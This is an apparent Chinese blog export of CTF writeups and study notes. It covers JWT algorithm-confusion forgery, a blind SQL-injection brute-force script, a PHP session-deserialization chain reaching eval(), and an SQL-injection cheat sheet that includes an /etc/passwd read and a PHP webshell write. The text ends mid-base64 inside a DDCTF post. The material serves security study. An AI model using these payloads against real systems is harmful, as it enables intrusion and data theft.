KEY-----\\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMRTzM9ujkHmh42aXG0aHZk/PK\\nomh6laVF+c3+D+klIjXglj7+/wxnztnhyOZpYxdtk7FfpHa3Xh4Pkpd5VivwOu1h\\nKk3XQYZeMHov4kW0yuS+5RpFV1Q2gm/NWGY52EaQmpCNFQbGNigZhu95R2OoMtuc\\nIC+LX+9V/mpyKe9R3wIDAQAB\\n-----END PUBLIC KEY----- 将这个文件存入txt文件内： -----BEGIN PUBLIC KEY----- MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMRTzM9ujkHmh42aXG0aHZk/PK omh6laVF+c3+D+klIjXglj7+/wxnztnhyOZpYxdtk7FfpHa3Xh4Pkpd5VivwOu1h Kk3XQYZeMHov4kW0yuS+5RpFV1Q2gm/NWGY52EaQmpCNFQbGNigZhu95R2OoMtuc IC+LX+9V/mpyKe9R3wIDAQAB -----END PUBLIC KEY----- 那么我们来尝试更改一下 alg 所指代的算法，将其从 RS256 这种非对称加密改成 HS256 这种对称加密，这样我们有公钥就可以伪造 JWT Token 从而为所欲为了。用 Python 脚本来伪造令牌，payload 部分填写自己想要的内容。 import jwt import base64 public = open(&#39;2.txt&#39;, &#39;r&#39;).read() print jwt.encode({&quot;name&quot;: &quot;chuddy&quot;,&quot;priv&quot;: &quot;admin&quot;}, key=public, algorithm=&#39;HS256&#39;) 运行发现报错了。直接去库源码里面把报错的那一段注释掉。简单粗暴 再次运行就会得到JWT TOKEN了 然后抓包更改session： 得到了admin的留言地址，访问就会得到flag web5打开链接发现： 猜测是修改header头来进行绕过的，经过尝试发现添加 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0Union.373 提示我要输入用户名：于是post传递username=chuddy 又提示我需要输入密码：于是post传递password=chuddy 得到 通过尝试得到了用户名union_373_Tom 这道题过滤了好多敏感字符串，尝试了一下发现可以通过order by注入得到密码 当传递的参数为： username=union_373_Tom&#39;/*&amp;password=*/ union select 1,2,&#39;1&#39; order by 3,2,&#39;1 返回为： 组织欢迎你，2! 当传递的参数为： username=union_373_Tom&#39;/*&amp;password=*/ union select 1,2,&#39;2&#39; order by 3,2,&#39;1 返回为： 组织欢迎你，union_373_Tom! 于是可以尝试使用脚本来跑： #coding=utf-8 import requests head = { &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0Union.373&#39; } url=&#39;http://39.100.83.188:8054/&#39; # res=requests.post(url,headers=data) # print res.content password = &quot;&quot; for i in range(10): for j in range(33,128): data={ &#39;username&#39;:&quot;union_373_Tom&#39;/*&quot;, &#39;password&#39;: &quot;*/ union select 1,2,\\&quot;&quot;+password+chr(j)+&quot;\\&quot; order by 3,2,&#39;1&quot; } print j res=requests.post(url,data=data,headers=head) # print res.content if &#39;union_373_Tom&#39; in res.content: password += chr(j-1) print password break 即可得到密码，就是flag 感觉这次iscc的题目不是特别难，而且还有好多原题，感觉自己还是很菜。","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]},{"title":"session 反序列化","slug":"session-反序列化","date":"2019-05-14T10:49:02.000Z","updated":"2019-05-29T12:32:11.053Z","comments":true,"path":"2019/05/14/session-反序列化/","link":"","permalink":"http://yoursite.com/2019/05/14/session-反序列化/","excerpt":"session-反序列化前言通过一道ctf题，感觉自己对php session 反序列化的认识并不深刻，所以想要再次总结一下","text":"session-反序列化前言通过一道ctf题，感觉自己对php session 反序列化的认识并不深刻，所以想要再次总结一下 简介在php.ini中存在几项配置项： session.save_path=&quot;&quot; --设置session的存储路径 session.save_handler=&quot;&quot; --设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式) session.auto_start boolen --指定会话模块是否在请求开始时启动一个会话,默认为0不启动 session.serialize_handler string --定义用来序列化/反序列化的处理器名字。默认使用php 以上的选项就是与PHP中的Session存储和序列话存储有关的选项。 在使用xampp组件安装中，上述的配置项的设置如下： session.save_path=&quot;D:\\xampp\\tmp&quot; 表明所有的session文件都是存储在xampp/tmp下 session.save_handler=files 表明session是以文件的方式来进行存储的 session.auto_start=0 表明默认不启动session session.serialize_handler=php 表明session的默认序列话引擎使用的是php序列话引擎 在上述的配置中，session.serialize_handler是用来设置session的序列话引擎的，除了默认的PHP引擎之外，还存在其他引擎，不同的引擎所对应的session的存储方式不相同。 php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值 php:存储方式是，键名+竖线+经过serialize()函数序列处理的值 php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值 默认引擎为PHP引擎, 可以添加代码ini_set(&#39;session.serialize_handler&#39;, &#39;需要设置的引擎&#39;); session 存储机制php中的session的内容并不是放在内存中的，二十以文件的方式来存储的，存储方式就是有配置项session.sace_handler来进行确定的,默认是以文件的方式存储。 存储文件都是以sess_sessionid来进行命名的，文件的内容就是session值的序列化之后的内容 不同版本的引擎 保存的文件也不同同样存储$_SESSION[&#39;chuddy&#39;]=、&quot;chuddy123&quot;;这样的一个session ini_set(&#39;session.serialize_handler&#39;, &#39;php_serialize&#39;); a:1:{s:6:&quot;chuddy&quot;;s:9:&quot;chuddy123&quot;;} ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;); chuddy|s:9:&quot;chuddy123&quot;; ini_set(&#39;session.serialize_handler&#39;, &#39;php_binary&#39;); \u0006chuddys:9:&quot;chuddy123&quot;; 由于`chuddy`的长度是6，6在ASCII表中对应的就是&lt;0x06&gt;。 根据php_binary的存储规则，最后就是\u0006chuddys:9:&quot;chuddy123&quot;; PHP Session中的序列化的危害PHP中的Session的实现是没有的问题，危害主要是由于程序员的Session使用不当而引起的。 如果在PHP在反序列化存储的$_SESSION数据时使用的引擎和序列化使用的引擎不一样，会导致数据无法正确第反序列化。通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法。 例如： $_SESSION[&#39;chuddy&#39;] = &#39;|O:11:&quot;chuddyClass&quot;:0:{}&#39;; 上述的$_SESSION数据使用php_serialize，那么最后的存储的内容就是a:1:{s:6:&quot;chuddy&quot;;s:24:&quot;|O:11:&quot;chuddyClass&quot;:0:{}&quot;;}。 但是当我们进行读取的时候，选择的是php，那么最后读取的内容就会发生改变的当使用php引擎的时候，php引擎会以|作为key和value的分隔符，那么就会将a:1:{s:6:&quot;chuddy&quot;;s:24:&quot;作为SESSION的key值，将O:11:&quot;chuddyClass&quot;:0:{}&quot;;}作为SESSION的value值，然后进行反序列化，最后会得到chuddyClass这个类 这种由于序列话化和反序列化所使用的不一样的引擎就是造成PHP Session序列话漏洞的原因。 实际利用存在session1.php和session2.php着这两个文件 session1.php &lt;?php ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;); echo @$_GET[&#39;chuddy&#39;]; session_start(); $_SESSION[&#39;chuddy&#39;] = @$_GET[&#39;chuddy&#39;]; ?&gt; session2.php &lt;?php ini_set(&#39;session.serialize_handler&#39;,&#39;php&#39;); session_start(); var_dump($_SESSION); class chuddy{ function __destruct(){ echo phpinfo(); } } ?&gt; 当访问session1.php时 提交一下数据： session1.php?chuddy=|O:6:%22chuddy%22:0:{} 此时传入的数据会按照php_serialize来进行序列化存储 然后去访问session2.php,页面会输出phpinfo()函数，说明成功执行了我们构造的函数。 是因为在访问session2.php时，程序会按照php引擎来解析，SESSION中的数据，此时就会反序列化伪造的数据，就会实例化一个chuddy对象，最后就会执行析构函数中的phpinfo() CTF例题安恒月赛的一道 反序列化题目： 环境配置： php版本&gt;5.5.4 #php.ini部分相关配置 session.auto_start=Off session.serialize_handler=php_serialize session.upload_progress.cleanup=Off session.upload_progress.enabled=On 主要给出了几个文件的源码： class.php &lt;?php highlight_string(file_get_contents(basename($_SERVER[&#39;PHP_SELF&#39;]))); //show_source(__FILE__); class foo1{ public $varr; function __construct(){ $this-&gt;varr = &quot;index.php&quot;; } function __destruct(){ if(file_exists($this-&gt;varr)){ echo &quot;&lt;br&gt;文件&quot;.$this-&gt;varr.&quot;存在&lt;br&gt;&quot;; } echo &quot;&lt;br&gt;这是foo1的析构函数&lt;br&gt;&quot;; } } class foo2{ public $varr; public $obj; function __construct(){ $this-&gt;varr = &#39;1234567890&#39;; $this-&gt;obj = null; } function __toString(){ $this-&gt;obj-&gt;execute(); return $this-&gt;varr; } function __desctuct(){ echo &quot;&lt;br&gt;这是foo2的析构函数&lt;br&gt;&quot;; } } class foo3{ public $varr; function execute(){ eval($this-&gt;varr); } function __desctuct(){ echo &quot;&lt;br&gt;这是foo3的析构函数&lt;br&gt;&quot;; } } ?&gt; index.php &lt;?php ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;); require(&quot;./class.php&quot;); session_start(); $obj = new foo1(); $obj-&gt;varr = &quot;phpinfo.php&quot;; ?&gt; phpinfo.php &lt;?php session_start(); require(&quot;./class.php&quot;); $f3 = new foo3(); $f3-&gt;varr = &quot;phpinfo();&quot;; $f3-&gt;execute(); ?&gt; 通过代码 发现了危险函数eval 可以想到利用php session 反序列化来进行构造自己想要的 访问phpinfo.php 发现[]可以看到一些敏感的配置信息，也找到一下比较有用的信息 session.upload_progress.enabled，当它为开启状态时，PHP能够在每一个文件上传时监测上传进度。 当一个上传在处理中，同时POST一个与php.ini中设置的session.upload_progress.name同名变量时，上传进度就可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是session.upload_progress.prefix与 session.upload_progress.name连接在一起的值。 a:1:{s:19:&quot;upload_progress_123&quot;;a:5:{s:10:&quot;start_time&quot;;i:1558005301;s:14:&quot;content_length&quot;;i:471;s:15:&quot;bytes_processed&quot;;i:471;s:4:&quot;done&quot;;b:1;s:5:&quot;files&quot;;a:1:{i:0;a:7:{s:10:&quot;field_name&quot;;s:4:&quot;file&quot;;s:4:&quot;name&quot;;s:139:&quot;|O:4:&quot;foo1&quot;:1:{s:4:&quot;varr&quot;;O:4:&quot;foo2&quot;:2:{s:4:&quot;varr&quot;;s:10:&quot;1234567890&quot;;s:3:&quot;obj&quot;;O:4:&quot;foo3&quot;:1:{s:4:&quot;varr&quot;;s:24:&quot;var_dump(scandir(&quot;./&quot;));&quot;;}}} 测试一下 构造一个可以实现我们想要的功能的本地测试的代码： &lt;?php class foo3{ public $varr=&#39;var_dump(scandir(&quot;./&quot;));&#39;; function execute(){ eval($this-&gt;varr); } } class foo2{ public $varr; public $obj; function __construct(){ $this-&gt;varr = &#39;1234567890&#39;; $this-&gt;obj = new foo3(); } function __toString(){ $this-&gt;obj-&gt;execute(); return $this-&gt;varr; } } class foo1{ public $varr; function __construct(){ $this-&gt;varr = new foo2(); } } $obj = new foo1(); print_r(serialize($obj)); ?&gt; 在foo1中的构造函数中定义varr的值为foo2的实例，在foo2中定义obj为foo3的实例，在foo3中定义$varr的值var_dump(scandir(‘./‘)); 输出了序列化后的类 O:4:&quot;foo1&quot;:1:{s:4:&quot;varr&quot;;O:4:&quot;foo2&quot;:2:{s:4:&quot;varr&quot;;s:10:&quot;1234567890&quot;;s:3:&quot;obj&quot;;O:4:&quot;foo3&quot;:1:{s:4:&quot;varr&quot;;s:24:&quot;var_dump(scandir(&quot;./&quot;));&quot;;}}} 然后通过上面讲的将这个类存入session文件中: &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;test&lt;/title&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=&quot;./index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;go&quot; /&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; 然后抓包修改相应的内容： [] 然后修改相应的参数 就可以找到 flag文件 并读取出来；这就不一一细说了。 总结感觉自己还是特别菜 好多还不会 希望能够静下心来 好好学","categories":[],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://yoursite.com/tags/web漏洞/"}]},{"title":"sql注入","slug":"sql注入","date":"2019-05-02T08:31:07.000Z","updated":"2019-05-29T12:32:11.717Z","comments":true,"path":"2019/05/02/sql注入/","link":"","permalink":"http://yoursite.com/2019/05/02/sql注入/","excerpt":"sql注入漏洞前言感觉自己以前学的比较粗糙，这一段打算逐一把学过的漏洞再重新学习一边，加深一下印象。","text":"sql注入漏洞前言感觉自己以前学的比较粗糙，这一段打算逐一把学过的漏洞再重新学习一边，加深一下印象。 sql注入简介Sql 注入攻击是通过将恶意的 Sql 查询或添加语句插入到应用的输入参数中，再在后台 Sql 服务器上解析执行进行的攻击，它目前黑客对数据库进行攻击的最常用手段之一。 mysql数据库的知识储备mysql数据库中的一些全局变量 user() 当前用户 version() 数据库版本 database() 当前数据库名 @@version_compile_os 当前的操作系统 数据库中常见的注释符： 1. -- 后面有一个空格 2. /*...*/ 3. # 在MySQL中有一个叫做information_schema的库，它存储着所有表的信息 虽然里面有这么多的表，常用的不是特别多 schemata、TABLES、COLUMNS schemata表，这个便存储了mysql数据库的所有库名 tables表里面包含了数据库中的所有的表名 COLUMNS表中存储了所有表的字段信息 一些常用的查找语句 所有用户 select group_concat(user) from mysql.user 用户hash: select group_concat(password) from mysql.user where user=&#39;root&#39; 所有数据库： select group_concat(schema_name) from information_schema.schemata 表名： select group_concat(table_name) from information_schema.tables where table_schema=&#39;库名&#39; //表中有主码约束，非空约束等完整性约束条件的才能用这个语句查询出来 select group_concat(table_name) from information_schema.table_constraints where table_schema=&#39;库名&#39; 字段名： select group_concat(column_name) from information_schema.columns where table_name=&#39;表名&#39; 读文件： select load_file(&#39;/etc/passwd&#39;) 写文件： select &lt;?php @eval($_POST[&#39;a&#39;]); ?&gt; into outfile &#39;/var/www/html/shell.php&#39; 常见的sql注入类型union注入联合注入也是常见一种注入方式，利用条件页面需要有回显位。 猜字段的长度页面有回显的情况下可以通过：order by 来猜测字段的长度 id=1&#39; order by 3-- 猜字段的位置如果已经知道字段的长度为3的话可以通过联合查询来爆出字段的位置 id=-1&#39; union select 1,2,3-- 基本语法union select 1,flag,3 from flag 过滤了逗号的联合注入mysql&gt; select * from user1 where id=-1 union select * from (select version())a join (select database())b join (select database())c; +--------+------+------+ | id | name | pass | +--------+------+------+ | 5.5.53 | test | test | +--------+------+------+ 1 row in set (0.04 sec) 报错注入mysql数据库的报错注入方法整理， floor UpdateXml ExtractValue NAME_CONST Error based Double Query Injection … floor?id=1 OR (SELECT 8627 FROM(SELECT COUNT(*),CONCAT(0x6368756464797e,(SELECT user()),0x7e636875646479,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) 操作： mysql&gt; select * from user where id=1 OR (SELECT 8627 FROM(SELECT COUNT(*),CONCAT(0x6368756464797e,(SELECT user()),0x7e636875646479,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a); ERROR 1062 (23000): Duplicate entry &#39;chuddy~root@localhost~chuddy1&#39; for key &#39;group_key&#39; ExtractValue(有长度限制,最长32位)?id=1 and extractvalue(1, concat(0x7e, (select @@version),0x7e)) mysql&gt; select * from user where 1 and extractvalue(1, concat(0x7e, (select @@version),0x7e)); ERROR 1105 (HY000): XPATH syntax error: &#39;~5.5.53~&#39; 当查询的书库超过32位 可以利用字符串截取函数，多次读取该数据 UpdateXml(有长度限制,最长32位)?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) 利用方式和ExtractValue方式差不多，当查询的书库超过32位 可以利用字符串截取函数，多次读取该数据 NAME_CONST(适用于低版本，不太好用)?id=261 and 1=(select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1)) as x) Error based Double Query Injection?id=1 or 1 group by concat_ws(0x7e,version(),floor(rand(0)*2)) having min(0) or 1 exp(5.5.5以上)?id=1 and (select exp(~(select * from(select user())x))) polygonmysql&gt; select * from user where name = &quot;&quot; and polygon(pass); ERROR 1367 (22007): Illegal non geometric &#39;`test`.`user`.`pass`&#39; value found during parsing 布尔盲注基本语法 id = 1 and ascii(substr((select database()),1,1))&gt;97--+ 由于Mysql4之后对大小写就不敏感，可以使用binary()函数使大小写敏感。 构造布尔条件的骚姿势//正常情况 &#39;or bool# true&#39;and bool# //不使用空格、注释 &#39;or(bool)=&#39;1 true&#39;and(bool)=&#39;1 //不使用or、and、注释 &#39;^!(bool)=&#39;1 &#39;=(bool)=&#39; &#39;||(bool)=&#39;1 true&#39;%26%26(bool)=&#39;1 //%26就是&amp; &#39;=if((bool),1,0)=&#39;0 &#39;-(bool)-&#39; &#39;^(bool)^&#39; //不使用等号、空格、注释 &#39;or(bool)&lt;&gt;&#39;0 &#39;or((bool)in(1))or&#39;0 //其他 or (case when (bool) then 1 else 0 end) 构造逻辑判断常见的逻辑判断函数 字符串的截取函数： left(user(),1)&gt;&#39;c&#39; right(user(),1)&gt;&#39;c&#39; substr(user(),1,1)&gt;&#39;c&#39; mid(user(),1,1)=&#39;c&#39; 查询字符串的长度: length(&#39;chuddy&#39;) 查询字符的ascii码： ord(&#39;a&#39;) ascii(&#39;a&#39;) ascii转换字符: char(97) 布尔盲注的基本语法： ascii(substr((查询的sql语句),1,1))&gt;97 一些绕过方式 过滤了空格可以一下代替 /*1*/ %20 %a0 过滤了 = like &lt;&gt; regexp 过滤了一些关键词 可以大小写绕过 unIon、seLect、 如果关键词被替换位空白 可以双写绕过 selselectect、 uniunionon 特殊的盲注方法: 利用order by 盲注 ----+----------+----------------------------------+ | id | username | password | +----+----------+----------------------------------+ | 1 | 2 | 5 | | 1 | admin | 51b7a76d51e70b419f60d3473fb6f900 | +----+----------+----------------------------------+ 2 rows in set (0.00 sec) mysql&gt; select * from admin where username=&#39;&#39; or 1 union select 1,2,&#39;6&#39; order by 3; +----+----------+----------------------------------+ | id | username | password | +----+----------+----------------------------------+ | 1 | admin | 51b7a76d51e70b419f60d3473fb6f900 | | 1 | 2 | 6 | +----+----------+----------------------------------+ 2 rows in set (0.01 sec) 过滤很严格的话 可以通过一些其他它方式爆破密码 mysql&gt; select * from user1 where name=&quot;user4&quot; &amp;&amp; pass&gt;&#39;a1&#39;; +------+-------+--------+ | id | name | pass | +------+-------+--------+ | 4 | user4 | a1b2c3 | +------+-------+--------+ 1 row in set (0.00 sec) mysql&gt; select * from user1 where name=&quot;user4&quot; &amp;&amp; pass&gt;&#39;a2&#39;; Empty set (0.00 sec) 跨表查询数据 mysql&gt; select * from user1 where id =1 and (select a.pass&lt;&#39;7&#39; from user a limit 1); +------+-------+------+ | id | name | pass | +------+-------+------+ | 1 | user1 | 123 | +------+-------+------+ 1 row in set (0.00 sec) mysql&gt; select * from user1 where id =1 and (select a.pass&gt;&#39;7&#39; from user a limit 1); Empty set (0.00 sec) 延时注入相交于bool盲注，就是把返回值0和1改为是否延时的标准，一般格式为：if((bool),sleep(5),0)和or (case when (bool) then sleep(5) else 0 end) 延时函数： BENCHMARK(100000,MD5(1)) sleep BENCHMARK()用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的cpu资源。推荐使用sleep() 如果着两个函数被ban了可以利用笛卡儿积造成延迟来进行注入 &#39; and if(ascii(substr((select database()),%d,1))&lt;%d,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B,information_schema.tables C),1)# insert和uodate注入//insert 的报错注入 mysql&gt; insert into user2 values(null,&#39;a&#39; and extractvalue(1, concat(0x7e, (select @@version),0x7e))); ERROR 1105 (HY000): XPATH syntax error: &#39;~5.5.53~&#39; mysql&gt; insert into user2 values(null,&#39;a&#39; and extractvalue(1, concat(0x7e, (select database()),0x7e))); ERROR 1105 (HY000): XPATH syntax error: &#39;~y1~&#39; //update的报错注入 mysql&gt; update user2 set name=&#39;a&#39; where pass=&#39;a&#39; and extractvalue(1, concat(0x7e, (select @@version),0x7e)); ERROR 1105 (HY000): XPATH syntax error: &#39;~5.5.53~&#39; mysql&gt; update user2 set name=&#39;a&#39; where pass=&#39;a&#39; and extractvalue(1, concat(0x7e, (select database()),0x7e)); ERROR 1105 (HY000): XPATH syntax error: &#39;~y1~&#39; //insert 延时注入 database为y1 mysql&gt; insert into user2(name,pass) values(&#39;a&#39;, mid((select database()),1,1)=&quot;1&quot; or sleep(3)); Query OK, 1 row affected (3.00 sec) mysql&gt; insert into user2(name,pass) values(&#39;a&#39;, mid((select database()),1,1)=&quot;y&quot; or sleep(3)); Query OK, 1 row affected (0.00 sec) 如果存在insert或者update,更新后的数据是可见的话,那么利用mysql中字符串在与数字进行运算的时候当作是0进行运算 mysql&gt; select &#39;&#39;+1; +------+ | &#39;&#39;+1 | +------+ | 1 | +------+ 1 row in set (0.00 sec) 那么我们可以利用查询的数据转化为10进制,然后进行运算,拿到我们计算的结果,在进行转化回去即可 insert into 情况下： mysql&gt; insert into user(id,name,pass) values(&#39;7&#39;,&#39;chuddy&#39;,&#39;&#39;+conv(hex(substr(database(),1 + (1-1) * 6,6)),16,10)); Query OK, 1 row affected (0.00 sec) mysql&gt; select * from user where id=7; +------+--------+------------+ | id | name | pass | +------+--------+------------+ | 7 | chuddy | 1952805748 | +------+--------+------------+ 1 row in set (0.00 sec) mysql&gt; select unhex(conv(1952805748,10,16)); +-------------------------------+ | unhex(conv(1952805748,10,16)) | +-------------------------------+ | test | +-------------------------------+ 1 row in set (0.00 sec) update 情况下： mysql&gt; update user set pass=&#39;&#39;+conv(hex(substr(user(),1 + (1-1) * 6,6)),16,10) where id=3; Query OK, 1 row affected (0.11 sec) Rows matched: 1 Changed: 1 Warnings: 0 mysql&gt; select * from user where id =3; +------+-------------+-----------------+ | id | name | pass | +------+-------------+-----------------+ | 3 | ccccccccccc | 125822936825964 | +------+-------------+-----------------+ 1 row in set (0.04 sec) mysql&gt; select unhex(conv(125822936825964,10,16)); +------------------------------------+ | unhex(conv(125822936825964,10,16)) | +------------------------------------+ | root@l | +------------------------------------+ 1 row in set (0.00 sec) order by 注入报错注入常见的利用方式： order by 1 and extractvalue(1, concat(0x7e, (select @@version),0x7e)) mysql&gt; select * from user order by 1 and extractvalue(1, concat(0x7e, (select @@version),0x7e)); ERROR 1105 (HY000): XPATH syntax error: &#39;~5.5.53~&#39; mysql&gt; select * from user order by 1 and extractvalue(1, concat(0x7e, (select database()),0x7e)); ERROR 1105 (HY000): XPATH syntax error: &#39;~test~&#39; 盲注盲注的基本操作\\order by IF((bool),1,(select 1 union select 2)) mysql&gt; select * from user order by if((substr(database(),1,1)&lt;&#39;a&#39;),1,(select 1 union select 2)); ERROR 1242 (21000): Subquery returns more than 1 row mysql&gt; select * from user order by if((substr(database(),1,1)&gt;&#39;a&#39;),1,(select 1 union select 2)); +------+---------------+-----------------------+ | id | name | pass | +------+---------------+-----------------------+ | 1 | aaaaaaaaaa | 123 | | 2 | bbbbbbbbbbbbb | 456 | | 3 | ccccccccccc | 3.2210671827446896e16 | | 4 | dddddddddddd | 258 | | 5 | eeeeeeeee | 159 | | NULL | | NULL | | 6 | cccc | 58 | | 7 | chuddy | 1952805748 | +------+---------------+-----------------------+ 8 rows in set (0.02 sec) 延时注入不推荐，因为每条数据都会执行延时，能用其他方法就不使用延时。\\order by IF(1,sleep(3),0); 两条数据就会延时了6秒 宽字节注入原理：在GBK编码时，mysql会认为两个字符是一个汉字（在前一个字节的ascii码大于128的情况下）。而经过转义之后的单引号&#39;会变为\\&#39;，即%5c%27。构造id=1%df%27%23，在经过转义传递给mysql时，就是id=1%df%5c%27%23，mysql在解析时，会认为%df%5c是一个汉字，而%27就会闭合掉原本sql语句中的（左）单引号，即select xxx from xxx where id=&#39;%df%5c&#39;#&#39;，%23用于注释掉原本sql语句中的（右）单引号。这就是宽字节注入的原理。 注入方式和正常的注入差不多的： %df%27%20union%20select%201,database()--+","categories":[],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://yoursite.com/tags/web漏洞/"}]},{"title":"didictf writeup","slug":"2019didictf部分writeup","date":"2019-04-22T08:18:10.000Z","updated":"2019-05-29T12:42:38.791Z","comments":true,"path":"2019/04/22/2019didictf部分writeup/","link":"","permalink":"http://yoursite.com/2019/04/22/2019didictf部分writeup/","excerpt":"2019DDCTF writeupweb","text":"2019DDCTF writeupweb 滴~打开题目 发现url中的jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09有一点不正常，像是base64加密得到的，尝试发现是flag.jpg先进行base16加密在进行两次base64加密得到的 页面的源代码中是对flag.jpg进行base64加密后输出的 &lt;title&gt;TmpZMlF6WXhOamN5UlRaQk56QTJOdz09&lt;/title&gt;flag.jpg&lt;/br&gt;flag.jpg&lt;/br&gt;&lt;img src=&#39;data:image/gif;base64,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